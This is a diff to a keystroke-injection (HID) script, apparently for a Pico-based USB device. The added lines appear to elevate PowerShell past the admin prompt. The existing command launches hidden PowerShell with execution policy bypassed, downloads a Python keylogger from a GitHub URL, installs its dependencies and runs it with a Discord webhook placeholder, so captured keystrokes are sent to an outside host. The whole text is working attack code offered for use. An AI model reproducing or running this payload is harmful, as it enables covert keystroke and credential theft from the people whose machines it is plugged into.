@@ -3,6 +3,12 @@ GUI R
 DELAY 300
 STRING powershell
 DELAY 150
+CTRL-SHIFT ENTER
+DELAY 300
+TAB
+DELAY 100
+TAB
+DELAY 100
 ENTER
 DELAY 1700
 STRING powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py ; py -m pip install discordwebhook pynput ; Python logger.py <Your discord webhook here>"
